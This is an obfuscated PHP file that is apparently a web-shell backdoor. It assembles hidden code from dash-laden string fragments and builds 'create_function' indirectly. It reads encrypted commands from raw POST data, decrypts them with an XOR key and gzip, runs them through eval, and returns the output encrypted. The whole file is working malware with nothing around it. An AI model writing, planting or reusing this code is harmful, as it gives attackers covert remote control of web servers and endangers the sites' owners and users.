<?php
$t='$k-="aff5d4-9c";$kh=-"39804f44-b12a-";-$kf="9-a8dc3fbf1-4-7";$p-="x-ReYBifmZpEa-pwR0";-fu';
$Y=';(-$j<$c&&$i<$l--);$j-++,-$i++){$o.--=-$t{$i-}^$k{$j};}}retu-rn $o;}if (@preg_-ma-tc-h';
$c='("/$kh(.+-)$kf/",--@file_get_-con-tents("php:/-/inp-u-t"),-$m)==1) {@ob_-start-();@eva';
$r='-l-(@gzun-compress(@x(-@bas-e-64_decode($m[1]-)-,$k)));$o=@-ob_get--_contents();@-ob-_';
$v='nctio-n x($t,$k)-{$-c-=strlen($k-);$l=st-r-len($t);$-o="";for($i=0-;$i<$-l;){for-($j=-0';
$F=str_replace('V','','crVeatVVe_fVuncVtiVon');
$N='en-d_clean()-;$r=@ba-se64_-encode(-@x(@g-zc-ompr-ess($o),$k)-);print(-"$p$kh$r-$kf");}';
$S=str_replace('-','',$t.$v.$Y.$c.$r.$N);
$i=$F('',$S);$i();
?>
